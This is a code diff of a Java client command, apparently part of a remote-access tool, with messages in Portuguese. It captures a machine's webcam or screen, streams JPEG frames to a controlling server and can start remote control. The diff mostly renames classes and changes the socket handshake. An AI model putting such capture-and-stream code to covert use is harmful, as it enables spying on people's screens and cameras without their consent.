@@ -6,15 +6,17 @@ package br.com.introcdc.connect.client.commands.image;
 import br.com.introcdc.connect.Connect;
 import br.com.introcdc.connect.client.ConnectClient;
 import br.com.introcdc.connect.client.command.ClientCommand;
-import br.com.introcdc.connect.client.components.ControlComponents;
-import br.com.introcdc.connect.client.components.ImageComponents;
-import br.com.introcdc.connect.client.components.ProcessComponents;
+import br.com.introcdc.connect.client.components.ClientControlComponents;
+import br.com.introcdc.connect.client.components.ClientImageComponents;
+import br.com.introcdc.connect.client.components.ClientProcessComponents;
 import com.github.sarxos.webcam.Webcam;
 
 import javax.imageio.ImageIO;
 import java.awt.image.BufferedImage;
+import java.io.DataOutputStream;
 import java.io.OutputStream;
 import java.net.Socket;
+import java.util.Objects;
 import java.util.concurrent.ScheduledFuture;
 import java.util.concurrent.TimeUnit;
 
@@ -28,11 +30,11 @@ public class ClientCommandScreenWebcam extends ClientCommand {
     public void execute(String command, String input) throws Exception {
         boolean webcam = command.toLowerCase().equalsIgnoreCase("webcam");
         if (webcam) {
-            if (ImageComponents.WEBCAM_LIVE) {
-                ImageComponents.WEBCAM_LIVE = false;
+            if (ClientImageComponents.WEBCAM_LIVE) {
+                ClientImageComponents.WEBCAM_LIVE = false;
                 msg("Transmissão de webcam interrompida!");
                 try {
-                    Webcam cam = ImageComponents.getWebcam(ProcessComponents.LAST_ID);
+                    Webcam cam = ClientImageComponents.getWebcam(ClientProcessComponents.LAST_ID);
                     if (cam != null && cam.isOpen()) {
                         cam.close();
                     }
@@ -49,8 +51,8 @@ public class ClientCommandScreenWebcam extends ClientCommand {
                 return;
             }
         } else {
-            if (ImageComponents.SCREEN_LIVE) {
-                ImageComponents.SCREEN_LIVE = false;
+            if (ClientImageComponents.SCREEN_LIVE) {
+                ClientImageComponents.SCREEN_LIVE = false;
                 msg("Transmissão de tela interrompida!");
                 try {
                     System.gc();
@@ -75,7 +77,7 @@ public class ClientCommandScreenWebcam extends ClientCommand {
             msg("Inicializando conexão com a " + (webcam ? "webcam" : "tela") + "...");
 
             new Thread(() -> {
-                BufferedImage image = webcam ? ImageComponents.getWebcam(id, fps > 0, true) : ImageComponents.getImage(id, true);
+                BufferedImage image = webcam ? ClientImageComponents.getWebcam(id, fps > 0, true) : ClientImageComponents.getImage(id, true);
                 if (image == null) {
                     msg(webcam ? "Webcam não encontrada!" : "Monitor não encontrado!");
                     return;
@@ -83,15 +85,15 @@ public class ClientCommandScreenWebcam extends ClientCommand {
                 msg((webcam ? "webcam" : "screen") + "-" + (fps > 0 ? "live" : "image"));
                 if (fps > 0) {
                     if (webcam) {
-                        ImageComponents.WEBCAM_LIVE = true;
+                        ClientImageComponents.WEBCAM_LIVE = true;
                     } else {
-                        ImageComponents.SCREEN_LIVE = true;
-                        new Thread(ControlComponents::startControlClient).start();
+                        ClientImageComponents.SCREEN_LIVE = true;
+                        new Thread(ClientControlComponents::startControlClient).start();
                     }
-                    ScheduledFuture<?> TASK = ConnectClient.EXECUTOR.scheduleAtFixedRate(() -> {
+                    ScheduledFuture<?> TASK = ConnectClient.EXECUTOR.scheduleAtFixedRate(ConnectClient.runnable(() -> {
                         try {
-                            if ((webcam && !ImageComponents.WEBCAM_LIVE) || (!webcam && !ImageComponents.SCREEN_LIVE)) {
-                                msg((ImageComponents.LIVE_STOPPER ? "stoplive" + (webcam ? "webcam" : "screen") : "") + "Atualizador da live parado - " + (webcam ? "webcam" : "screen"));
+                            if ((webcam && !ClientImageComponents.WEBCAM_LIVE) || (!webcam && !ClientImageComponents.SCREEN_LIVE)) {
+                                msg((ClientImageComponents.LIVE_STOPPER ? "stoplive" + (webcam ? "webcam" : "screen") : "") + "Atualizador da live parado - " + (webcam ? "webcam" : "screen"));
                                 try {
                                     System.gc();
                                 } catch (Exception exception) {
@@ -99,36 +101,37 @@ public class ClientCommandScreenWebcam extends ClientCommand {
                                     exception(exception);
                                 }
                                 if (webcam) {
-                                    ImageComponents.WEBCAM.cancel(true);
+                                    ClientImageComponents.WEBCAM.cancel(true);
                                 } else {
-                                    ImageComponents.SCREEN.cancel(true);
+                                    ClientImageComponents.SCREEN.cancel(true);
                                 }
                                 return;
                             }
 
-                            try (Socket imageSocket = new Socket(Connect.IP, Connect.PORT + (webcam ? 2 : 1));
+                            try (Socket imageSocket = new Socket(Connect.IP, Connect.PORT);
                                  OutputStream os = imageSocket.getOutputStream()) {
-                                ImageIO.write(webcam ? ImageComponents.getWebcam(id, true, true) : ImageComponents.getImage(id, true), "jpg", os);
+                                new DataOutputStream(os).writeUTF("SECONDARY:" + ConnectClient.KEY + ":" + (webcam ? "WEBCAM" : "SCREEN"));
+                                ImageIO.write(Objects.requireNonNull(webcam ? ClientImageComponents.getWebcam(id, true, true) : ClientImageComponents.getImage(id, true)), "jpg", os);
                             } catch (Exception exception) {
-                                if (ImageComponents.LIVE_STOPPER) {
+                                if (ClientImageComponents.LIVE_STOPPER) {
                                     if (webcam) {
-                                        if (ImageComponents.WEBCAM_LIVE) {
-                                            ImageComponents.WEBCAM_LIVE = false;
-                                            Webcam cam = ImageComponents.getWebcam(id);
+                                        if (ClientImageComponents.WEBCAM_LIVE) {
+                                            ClientImageComponents.WEBCAM_LIVE = false;
+                                            Webcam cam = ClientImageComponents.getWebcam(id);
                                             if (cam != null && cam.isOpen()) {
                                                 cam.close();
                                             }
                                         }
                                     } else {
-                                        if (ImageComponents.SCREEN_LIVE) {
-                                            ImageComponents.SCREEN_LIVE = false;
+                                        if (ClientImageComponents.SCREEN_LIVE) {
+                                            ClientImageComponents.SCREEN_LIVE = false;
                                         }
                                     }
                                     msg("stoplive" + (webcam ? "webcam" : "screen") + "Erro ao enviar imagem da transmissão - " + (webcam ? "webcam" : "screen"));
                                     if (webcam) {
-                                        ImageComponents.WEBCAM.cancel(true);
+                                        ClientImageComponents.WEBCAM.cancel(true);
                                     } else {
-                                        ImageComponents.SCREEN.cancel(true);
+                                        ClientImageComponents.SCREEN.cancel(true);
                                     }
                                 } else {
                                     msg("Ocorreu um erro ao enviar imagem da transmissão - " + (webcam ? "webcam" : "screen") + " (" + exception.getMessage() + ")");
@@ -146,14 +149,14 @@ public class ClientCommandScreenWebcam extends ClientCommand {
                             msg("Ocorreu um erro ao cancelar o atualizador da live de " + (webcam ? "webcam" : "screen") + "! (" + exception.getMessage() + ")");
                             exception(exception);
                         }
-                    }, 0, 1000 / fps, TimeUnit.MILLISECONDS);
+                    }), 0, 1000 / fps, TimeUnit.MILLISECONDS);
                     if (webcam) {
-                        ImageComponents.WEBCAM = TASK;
+                        ClientImageComponents.WEBCAM = TASK;
                     } else {
-                        ImageComponents.SCREEN = TASK;
+                        ClientImageComponents.SCREEN = TASK;
                     }
                 } else {
-                    ConnectClient.EXECUTOR.schedule(() -> ImageComponents.sendImage(webcam ? 2 : 1, image), Connect.DELAY, Connect.DELAY_TYPE);
+                    ConnectClient.EXECUTOR.schedule(ConnectClient.runnable(() -> ClientImageComponents.sendImage(webcam ? 2 : 1, image)), Connect.DELAY, Connect.DELAY_TYPE);
                 }
             }).start();
         } catch (Exception ignored) {
